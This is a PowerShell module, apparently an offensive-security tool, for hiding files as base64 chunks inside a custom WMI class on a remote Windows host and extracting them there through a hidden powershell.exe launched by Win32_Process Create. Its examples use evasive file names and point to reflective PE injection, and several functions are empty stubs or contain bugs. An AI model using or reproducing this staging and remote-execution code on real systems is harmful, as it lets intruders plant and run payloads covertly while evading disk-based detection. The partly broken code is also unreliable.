################################################################################
# Let's get the file over there
################################################################################
Function Invoke-WMIUpload {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName
	
	.EXAMPLE
	
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Payload,
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$ClassName = "WMIFS"
    )
    Begin {
    } Process {
        New-WMIClass -ClassName WMIFS -Verbose -Target $Target
        $EncodedText = ConvertTo-Base64 -FileName $Payload -Verbose
        Invoke-InsertFile -EncodedText $EncodedText -FileName $Payload -ClassName $ClassName -StrLen 8000 -Verbose        
    } End { 
    }
}

################################################################################
# Extract file remotely
################################################################################
Function Invoke-WMIRemoteExtract {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName

    .PARAMETER Destination
	
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")].
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
            [string]$Payload,
        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
            [string]$ClassName = "WMIFS",
        [Parameter(Mandatory=$true, HelpMessage="Location on remote file system to place extracted file.")]
            [string]$Destination = "$env:windir\system32\wbem\"
    )
    Begin {
        $InvokeRetrieveFile = (Get-Command Invoke-RetrieveFile).Definition
        $ConvertFromBase64 = (Get-Command ConvertFrom-Base64).Definition
        $Command1 = "`$File = Invoke-RetrieveFile -FileName $Payload -ClassName $ClassName -Verbose"
        $Command2 = "ConvertFrom-Base64 -EncodedText `$File -FileName $Destination\$Payload -Verbose"
        $RemoteCommand = "powershell.exe -NoP -NonI -Command '$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;'"
    } Process {
        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand
    } End { 
    }
}

################################################################################
# Register WMI Provider Method
################################################################################
Function Install-WMIProviderMethod {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName
	
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
            [string]$Payload,
        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
            [string]$ClassName = "WMIFS"
    )
    Begin {
        
    } Process {
        
    } End { 
    }
}

################################################################################
# Extract file remotely
################################################################################
Function Install-WMIProvider {
<#
	.SYNOPSIS
	
	.PARAMETER Target
    
    .PARAMETER Payload

    .PARAMETER ClassName

    .PARAMETER Destination
	
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Payload,
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$ClassName = "WMIFS",
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Destination = "$env:windir\system32\wbem\"
    )
    Begin {
        
    } Process {
        
    } End { 
    }
}

################################################################################
################################################################################
Function local:Add-Method {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Parameter to add property to.")] 
            [Object][ref]$Parameters,
        [Parameter(Mandatory=$True, HelpMessage="Property to add.")] 
            [Object]$Property,
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [ValidateSet("In", "Out")] 
            [String]$Direction,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Int]$Index,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object]$MappingStrings
    )
    $Parameters.Properties.Add($Property, [System.Management.CimType]::String, $false)
    $Parameters.Properties[$Property].Qualifiers.Add($Direction, $false)
    $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index, $false, $true, $false, $false)
    $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
}

################################################################################
################################################################################
Function local:Add-Property {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Parameter to add property to.")] 
            [Object][ref]$Parameters,
        [Parameter(Mandatory=$True, HelpMessage="Property to add.")] 
            [Object]$Property,
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [ValidateSet("In", "Out")] 
            [String]$Direction,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Int]$Index,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object]$MappingStrings
    )
    $Parameters.Properties.Add($Property, [System.Management.CimType]::String, $false)
    $Parameters.Properties[$Property].Qualifiers.Add($Direction, $false)
    $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index, $false, $true, $false, $false)
    $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
}

################################################################################
################################################################################
Function local:New-Parameters {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [ValidateSet("In", "Out")] 
            [String]$Direction
    )
    $__PARAMETERS = New-Object System.Management.ManagementClass("ROOT", "__PARAMETERS", $null)
    $InParameters = $__PARAMETERS.Clone()
    $InParameters.Qualifiers.Add($Direction, $false)
}

################################################################################
################################################################################
Function local:Get-ManagementBaseObject {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object]$Class
    )
    $TempPtr = [System.IntPtr]$Class
    $DotNetPath = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
    $SystemManagement = [System.Reflection.Assembly]::LoadFile($DotNetPath+"System.Management.dll")

    $IWbemClassObjectFreeThreaded = $SystemManagement.GetType(‘System.Management.IWbemClassObjectFreeThreaded’)
    $IWbemClassObjectFreeThreaded_ctor = $IWbemClassObjectFreeThreaded.GetConstructors()[0]
    $IWbemClassObjectFreeThreadedInstance = $IWbemClassObjectFreeThreaded_ctor.Invoke($TempPtr)

    $ManagementBaseObject = $SystemManagement.GetType(‘System.Management.ManagementBaseObject’)
    $ManagementBaseObject_ctor = $ManagementBaseObject.GetConstructors([Reflection.BindingFlags] "NonPublic, Instance")[1]
    $ManagementBaseObjectInstance = $ManagementBaseObject_ctor.Invoke($IWbemClassObjectFreeThreadedInstance)

    Return $ManagementBaseObjectInstance
}

################################################################################
################################################################################
Function local:Invoke-ProviderSetup {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object]$Class
    )

    $Guid = New-Object System.Guid

    $__Win32Provider = Set-WmiInstance -Class __Win32Provider -Arguments @{
        Name = $Provider;
        ClsId = "{$Guid}";
        ImpersonationLevel = 1;
        PerUserInitialization = "FALSE";
        HostingModel = "NetworkServiceHost";
    };

    $__InstanceProviderRegistration = Set-WmiInstance -Class __InstanceProviderRegistration -Arguments @{
        Provider = $__Win32Provider;
        SupportsGet = "TRUE";
        SupportsPut = "TRUE";
        SupportsDelete = "TRUE";
        SupportsEnumeration = "TRUE";
        QuerySupportLevels = [String[]]@("WQL:UnarySelect");
    };

    $__InstanceProviderRegistration = Set-WmiInstance -Class __MethodProviderRegistration -Arguments @{
        Provider = $__Win32Provider;
    };
}

################################################################################
# Create a new WMI Class
################################################################################
Function local:New-WMIClass {
<#
	.SYNOPSIS
	Creates a new WMI class to be used to store files
	.PARAMETER ClassName
	Name of class to create.
	.EXAMPLE
	New-WMIClass -ClassName WMIFS
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
            [string]$Target
    )
    Begin {
        $Class = New-Object System.Management.ManagementClass("\\$Target\root\cimv2", [String]::Empty, $null); 
    } Process {
        $Class["__CLASS"] = $ClassName; 

        $Class.Qualifiers.Add("Static", $true)

        $Class.Properties.Add("FileStore", [System.Management.CimType]::String, $false)
        $Class.Properties["FileStore"].Qualifiers.Add("Key", $true)
        $Class.Properties["FileStore"].Qualifiers.Add("MaxLen", $([int32]::MaxValue - 1))

        $Class.Properties.Add("FileName", [System.Management.CimType]::String, $false)
        $Class.Properties["FileName"].Qualifiers.Add("Key", $true)

        $Class.Properties.Add("Index", [System.Management.CimType]::String, $false)
        $Class.Properties["Index"].Qualifiers.Add("Key", $true)
    } End {
        $Class.Put()
    }
}

################################################################################
# Convert the input file to Base64
# https://github.com/samratashok/nishang/blob/master/Utility/ExetoText.ps1
################################################################################
Function ConvertTo-Base64 {
<#
	.SYNOPSIS
	Converts a file to a Base64 encoded string by reading it in as raw bytes
	.PARAMETER FileName
	Path to the File to convert
	.EXAMPLE
	$EncodedText = ConvertTo-Base64 -FileName "cmd.exe" -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Path to File.")]
            [string]$FileName
    )
    Begin {
    } Process {
        Write-Verbose "Reading $FileName"
        [byte[]]$File = Get-Content -Encoding Byte -Path $FileName
        Write-Verbose "Encoding $FileName"
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($File)
        $EncodedText = [Convert]::ToBase64String($Bytes)
        Write-Verbose "Finished Encoding $FileName"
    } End {
        Write-Output $EncodedText
    }
}

################################################################################
# Insert the Base64 Encoded File into the WMI Class
################################################################################
Function Invoke-InsertFile {
<#
	.SYNOPSIS
	Slices a string into defined lengths and inserts it into a WMI class.
	.PARAMETER EncodedText
	The Base64 encoded text to insert.
	.PARAMETER FileName
	Name to identify the file in WMI. This value can be random.
	.PARAMETER ClassName
	Name of the WMI class to insert into.
	.EXAMPLE
	Invoke-InsertFile -EncodedText $EncodedText -FileName "definately_not_cmd.exe" -ClassName WMIFS -StrLen $length -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, 
            HelpMessage="Encoded Text to Insert",
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$true, HelpMessage="Name to identify the file in WMI.")]
            [string]$FileName,
        [Parameter(Mandatory=$true, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Allowed String Length")]
            [string]$StrLen = 8000,
        [Parameter(Mandatory=$false, HelpMessage="Encrypt the input file. This increase the file size by approximately 4x")]
            [switch]$Encrypt,
        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key")]
        [ValidateLength(16,16)]
            [string]$Key
    )
    Begin {
        $index = 0
        if ($Encrypt) {
            #Rough estimate
            $StrLen /= 4.2
            $StrLen = [Math]::Floor($StrLen)
        }
    } Process {
        For ($i = 0; $i -lt $EncodedText.Length; $i += $strlen) {
            Write-Verbose "Inserting Section: $i to $($i + $strlen) ($index)" 
            if ($($i + $strlen) -le $EncodedText.Length) {
                [string]$substring = $EncodedText.Substring($i, $strlen)
            } else {
                [string]$substring = $EncodedText.Substring($i, $($EncodedText.Length - $i))
            }
            if ($Encrypt) {
                if ($key) {
                    $substring = ConvertTo-EncryptedText -PlaintextString $substring -Key $Key
                } else {
                    $substring = ConvertTo-EncryptedText -PlaintextString $substring
                }
            }
            Set-WmiInstance -Class $ClassName -ComputerName $Target -Arguments @{
                FileStore = $Substring;
                FileName = $FileName; 
                Index = $index;
            } | Out-Null
            $index++;
        }
    } End {
    }
}

################################################################################
# Pull the file back from WMI
# Ugly Hack to get it working
# an ORDER BY would nice
################################################################################
Function Invoke-RetrieveFile {
<#
	.SYNOPSIS
	Retrieves a file from WMI identified by the FileName
	.PARAMETER FileName
	Name of the file in WMI.
	.PARAMETER ClassName
	Name of the WMI class to retrieve from.
	.EXAMPLE
	$File = Invoke-RetrieveFile -FileName "cmd.exe" -ClassName WMIFS -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Name of File to Retrieve")]
            [string]$FileName,
        [Parameter(Mandatory=$true, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Decrypt the Retrieved File")]
            [switch]$Decrypt,
        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key")]
        [ValidateLength(16,16)]
            [string]$Key
    )
    Begin {
    } Process {
        $query = Get-WmiObject -Query "SELECT * FROM $ClassName WHERE FileName LIKE '$FileName'"
        [String]$FilePart = [String]::Empty
        For($j = 0; $j -lt $query.Count; $j++) {
            [String]$FileStore = $($query | ? Index -EQ $j).FileStore
            Write-Verbose "Reading Section $j ($($FileStore.Length))"
            if ($Decrypt) {
                if ($key) {
                    $FilePart += $(ConvertFrom-EncryptedText -EncryptedString $FileStore -Key $Key)
                } else {
                    $FilePart += $(ConvertFrom-EncryptedText -EncryptedString $FileStore)
                }
            } else {
                $FilePart += $FileStore
            }
        }
    } End {
        Write-Output $FilePart
    }
}

################################################################################
# Covert the file back from Base64 to bytes
# https://github.com/samratashok/nishang/blob/master/Utility/TexttoExe.ps1
################################################################################
Function ConvertFrom-Base64 {
<#
	.SYNOPSIS
	Converts a File from Base64 back to raw bytes
	.PARAMETER EncodedText
	The Base64 encoded text to decode.
	.PARAMETER WriteToDisk
	Switch to write file back to disk
	.PARAMETER FileName
	Name of file to write out to.
	.EXAMPLE
	ConvertFrom-Base64 -EncodedText $EncodedText -WriteToDisk -FileName 'C:\calc.exe' -Verbose
	
	$File = ConvertFrom-Base64 -EncodedText $EncodedText -Verbose
	Set-Content -Path "NothingToSeeHere.txt" -Value $File -Encoding Byte
	Or consider using Invoke-ReflectivePEInjection here...
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Text to Decode",
            ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$false, HelpMessage="Name of File to Convert")]
            [switch]$WriteToDisk,
		[Parameter(Mandatory=$false, HelpMessage="Name of File to Write Out")]
            [string]$FileName = "NothingToSeeHere.txt"
    )
    Begin {
    } Process {
        Write-Verbose "Decoding File"
        $DecodedText = [System.Convert]::FromBase64String($EncodedText)
        Write-Verbose "Finished Decoding File"
        [byte[]]$Output = ([System.Text.Encoding]::Unicode.GetString($DecodedText)) -split ' '
    } End {
		if ($WriteToDisk) {
			Write-Verbose "Writing File to Disk as $FileName"
			Set-Content -Path $FileName -Value $Output -Encoding Byte
		} else {
			Write-Output $Output
		}
    }
}

################################################################################
# Encrypt the string before inserting
################################################################################
Function ConvertTo-EncryptedText{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="String of Text to Encrypt.")]
            [string]$PlaintextString,
        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key.")]
            [string]$Key
    )
    Begin {
        $SecureString = ConvertTo-SecureString -String $PlaintextString -AsPlainText -Force
    } Process {
        if ($key) {
            $EncryptedString = ConvertFrom-SecureString -SecureString $SecureString -Key $Key
        } else {
            $EncryptedString = ConvertFrom-SecureString -SecureString $SecureString
        }
    } End {
        $EncryptedString
    }
}

################################################################################
# Decrypt the string after retrieval
################################################################################
Function ConvertFrom-EncryptedText{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="String of Text to Decrypt.")]
            [string]$EncryptedString,
        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key")]
            [string]$Key
    )
    Begin {

    } Process {
        if ($key) {
            $SecureString = ConvertTo-SecureString -String $EncryptedString -Key $Key
        } else {
            $SecureString = ConvertTo-SecureString -String $EncryptedString
        }
        $PlaintextString = (New-Object System.Net.NetworkCredential([string]::Empty, $SecureString)).password
    } End {
        $PlaintextString
    }
}
